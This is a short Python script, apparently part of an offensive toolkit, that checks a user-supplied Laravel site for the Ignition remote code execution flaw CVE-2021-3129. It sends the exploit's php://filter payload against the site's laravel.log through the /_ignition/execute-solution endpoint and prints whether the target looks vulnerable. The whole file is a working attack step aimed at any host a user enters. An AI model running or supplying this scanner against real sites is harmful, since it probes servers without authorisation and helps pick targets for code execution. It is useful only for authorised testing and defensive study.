import requests
from colorama import Fore

def run():
    url = input("\n[+] Enter Laravel Site: ").strip()
    payload = "/_ignition/execute-solution"
    
    data = {
        "solution": "Facade\\Ignition\\Solutions\\MakeViewVariableOptionalSolution",
        "parameters": {
            "variableName": "username",
            "viewFile": "php://filter/write=convert.quoted-printable-decode|convert.iconv.utf-16le.utf-8|convert.base64-decode/resource=../storage/logs/laravel.log"
        }
    }
    
    try:
        response = requests.post(url+payload, json=data)
        if "file_get_contents" in response.text:
            print(Fore.GREEN + "[+] Vulnerable to Laravel RCE (CVE-2021-3129)")
        else:
            print(Fore.RED + "[!] Not vulnerable")
    except Exception as e:
        print(Fore.RED + f"[!] Error: {str(e)}")